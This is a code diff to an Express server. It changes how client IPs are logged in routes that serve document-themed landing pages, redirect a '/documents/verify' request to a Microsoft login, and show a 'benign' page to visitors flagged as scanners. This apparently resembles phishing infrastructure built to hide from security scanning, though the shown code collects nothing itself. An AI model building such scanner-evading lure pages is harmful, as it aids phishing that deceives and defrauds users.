@@ -109,7 +109,7 @@ const apiLimiter = rateLimit({
   standardHeaders: true,
   legacyHeaders: false,
   handler: (req, res) => {
-    // log('warn', { event: 'api_rate_limited', ip: req.clientIp, reason: 'api rate limit' });
+    log('warn', { event: 'api_rate_limited', ip: req.clientIp, reason: 'api rate limit' });
     res.status(429).json({ error: 'API rate limit exceeded' });
   }
 });
@@ -280,7 +280,7 @@ function scannerMiddleware(req, res, next) {
 }
 
 function apiProtectionMiddleware(req, res, next) {
-  const realIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                req.headers['x-real-ip'] ||
                req.ip;
   // ==================== REQUEST TIMING PROTECTION ====================
@@ -304,7 +304,7 @@ function apiProtectionMiddleware(req, res, next) {
 // Request Timing Protection
 const requestTimestamps = new Map();
 function isTooFast(req) {
-  const ip = req.clientIp;
+  const ip = req.ip;
   const now = Date.now();
   const lastRequest = requestTimestamps.get(ip) || 0;
   
@@ -321,13 +321,13 @@ app.use(scannerMiddleware);
 
 // ======= Routes =======
 app.get('/', (req, res) => {
-  log('warn', { event: 'root_scan', ip: req.clientIp });
+  log('warn', { event: 'root_scan', ip: req.ip });
   return serveBenignPage(res); // Show generic error page
 });
 
 app.get('/documents/:docId',(req, res) => {
   const docId = sanitizeInput(req.params.docId);
-  log('info', { event: 'serve_landing', ip: req.clientIp, docId });
+  log('info', { event: 'serve_landing', ip: req.ip, docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
@@ -338,19 +338,19 @@ app.post('/documents/verify', apiProtectionMiddleware, (req, res) => {
     microsoft: 'https://login.microsoftonline.com/'
   };
   const redirectUrl = testingUrls[provider] || '/error';
-  log('info', { event: 'auth_verify', ip: req.clientIp, provider, redirectUrl });
+  log('info', { event: 'auth_verify', ip: req.ip, provider, redirectUrl });
    return res.redirect(redirectUrl);
 });
 
 app.get('/health', (req, res) => {
-  res.json({ status: 'healthy', timestamp: Date.now(), uptime: process.uptime(), ip: req.clientIp });
+  res.json({ status: 'healthy', timestamp: Date.now(), uptime: process.uptime(), ip: req.ip });
 });
 
 app.get('/error', (req, res) => serveBenignPage(res));
 
 // ======= Error handling =======
 app.use((err, req, res, next) => {
-  log('error', { event: 'internal_error', ip: req.clientIp, reason: err?.message });
+  log('error', { event: 'internal_error', ip: req.ip, reason: err?.message });
   res.status(500).send('Internal Server Error');
 });
 
